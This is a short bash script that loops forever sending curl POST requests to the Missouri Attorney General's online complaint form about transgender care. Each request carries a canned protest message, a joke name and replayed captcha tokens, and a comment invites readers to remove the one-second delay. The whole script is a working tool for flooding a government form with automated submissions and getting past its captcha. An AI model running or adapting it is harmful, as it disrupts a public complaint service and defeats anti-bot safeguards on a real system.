...
while :
do
curl -X POST https://ago.mo.gov/file-a-complaint/transgender-center-concerns?sf_cntrl_id=ctl00%24MainContent%24C001 \
    -H "Content-Type: application/json" \
    -d "-----------------------------58485654922338062751648543285
    Content-Disposition: form-data; name="TextFieldController_4"

    Bofa
    -----------------------------58485654922338062751648543285
    ...
    Transgender rights are human rights, and it's concerning that Missouri is trying to violate the life, liberty, and property of its citizens.
    -----------------------------58485654922338062751648543285
    ...
    0T8RdQ14SuBo+AwbKzo+SkK+O+I=
    -----------------------------58485654922338062751648543285
    Content-Disposition: form-data; name="captcha-iv"

    Uyz4dFgrrvUd6EGmyovZtQ==
    -----------------------------58485654922338062751648543285
    Content-Disposition: form-data; name="captcha-k"

    MehikCjUYcIvALJJsePG3nb1nPO89AgWpTOsvj5tOTtxvcM7gyxQKypUcUM2LfWtBpejQ4BQpvFd3nraohhgbw==
    -----------------------------58485654922338062751648543285--"
    sleep 1 # i sure hope nobody removes this from the script
done
